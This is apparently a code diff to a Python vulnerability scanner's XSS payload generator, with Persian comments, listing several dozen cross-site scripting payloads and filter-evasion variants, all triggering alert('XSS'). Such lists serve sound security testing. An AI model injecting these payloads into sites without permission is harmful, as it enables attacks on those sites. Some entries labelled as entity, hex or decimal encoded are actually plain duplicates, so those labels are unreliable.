@@ -248,21 +248,53 @@ class VulnerabilityScanner:
         def generate_xss_payloads(self) -> List[str]:
             """تولید پیلودهای XSS مختلف برای تست"""
             return [  # لیستی از پیلودهای XSS
-                "<script>alert('XSS')</script>",  # تزریق اسکریپت
-                "<img src=x onerror=alert('XSS')>",  # تزریق از طریق ویژگی onerror
-                "<svg/onload=alert('XSS')>",  # تزریق از طریق ویژگی onload
-                "javascript:alert('XSS')",  # تزریق جاوا اسکریپت
-                "\"><script>alert('XSS')</script>",  # تزریق اسکریپت با بستن تگ
-                "';alert('XSS')//",  # تزریق جاوا اسکریپت با بستن رشته و کامنت
-                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",  # تزریق اسکریپت با تگ های شکسته
-                "<<SCRIPT>>alert('XSS');//<<SCRIPT>>",  # تزریق اسکریپت با حروف بزرگ
-                "<%<!--'%><script>alert('XSS');</script -->",  # تزریق اسکریپت با استفاده از کامنت های HTML
-                "<iframe src=\"javascript:alert('XSS')\">",  # تزریق از طریق iframe
-                "<object data=\"javascript:alert('XSS')\">",  # تزریق از طریق object
-                "<svg><script>alert('XSS')</script></svg>",  # تزریق اسکریپت داخل تگ svg
-                "<math><maction xlink:href=\"javascript:alert('XSS')\">",  # تزریق از طریق math
-                "<table background=\"javascript:alert('XSS')\">",  # تزریق از طریق background
-                "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",  # تزریق از طریق data URI
+                "<script>alert('XSS')</script>",
+        "<SCRIPT>alert('XSS')</SCRIPT>", # حروف بزرگ
+        "<scr<script>ipt>alert('XSS')</scr</script>ipt>", # تگ شکسته
+        "<img src=x onerror=alert('XSS')>",
+        "<img src=x οnerrοr=alert('XSS')>", # استفاده از کاراکترهای مشابه
+        "<svg/onload=alert('XSS')>",
+        "<svg/οnlοad=alert('XSS')>", # استفاده از کاراکترهای مشابه
+        "<details/open/ontoggle=alert('XSS')>", # HTML5
+        "<iframe src=javascript:alert('XSS')>",
+        "<object data=javascript:alert('XSS')>",
+        "<embed src=javascript:alert('XSS')>",
+        "<a href=\"javascript:alert('XSS')\">Click Me</a>",
+        "`<script>alert('XSS')</script>`", # بک‌تیک
+        '"><script>alert("XSS")</script>', # بستن تگ و تزریق
+        "';alert('XSS');//", # بستن رشته و تزریق
+        '</script><script>alert("XSS")</script>', # بستن و باز کردن تگ
+        "<w=\"\" /><script>alert('XSS')</script>", # شکستن تگ با ویژگی خالی
+        "<w='' /><script>alert('XSS')</script>", # شکستن تگ با ویژگی خالی
+        "<textarea><script>alert('XSS')</script></textarea>", # اسکریپت در textarea
+        "<title><script>alert('XSS')</script></title>", # اسکریپت در title
+        "<style></style><script>alert('XSS')</script>", # اسکریپت بعد از style
+        "<div style=\"width:expression(alert('XSS'));\"></div>", # expression در style (IE)
+        "<div style=\"background-image: url(javascript:alert('XSS'))\"></div>", # جاوااسکریپت در background-image
+        "<input type=\"image\" src=\"\" onerror=\"alert('XSS')\">", # input type image با onerror
+        "<body onload=alert('XSS')>", # body با onload
+        "<input onfocus=alert('XSS') autofocus>", # onfocus با autofocus
+        "<select onchange=alert('XSS')><option>Test</option></select>", # onchange در select
+        "<marquee onstart=alert('XSS')>", # marquee با onstart
+        "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", # srcdoc با HTML entities
+        "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", # srcdoc
+        "<math><maction xlink:href=\"javascript:alert('XSS')\"></maction></math>",
+        "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert('XSS')</script></body></foreignObject></svg>", # SVG خارجی
+        "<svg onload=\"javascript:alert('XSS')\">", # SVG onload
+        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">", # meta refresh
+        "<!--<script>alert('XSS')</script>-->", # اسکریپت در کامنت
+        "<![CDATA[<script>alert('XSS')</script>]]>", # اسکریپت در CDATA
+        "'\"",  # تلاش برای شکستن context
+        "\\",  # تلاش برای escape
+        "%253Cscript%253Ealert('XSS')%253C/script%253E", # Double URL encoded
+        "<script>alert('XSS')</script>", # HTML entities
+        "<script>alert('XSS')</script>", # Hex encoded
+        "<script>alert('XSS')</script>", # Decimal encoded
+        "jav\tascript:alert('XSS')", # استفاده از Tab
+        "java\nscript:alert('XSS')", # استفاده از Newline
+        "javascript\x3aalert('XSS')", # استفاده از Hex encoding در پروتکل
+        "javascript:alert('XSS')", # استفاده از HTML entity در پروتکل
+        "<<SCRIPT>alert(\"XSS\")//<</SCRIPT>", # تگ با حروف بزرگ و کاراکترهای اضافه
             ]
 
 
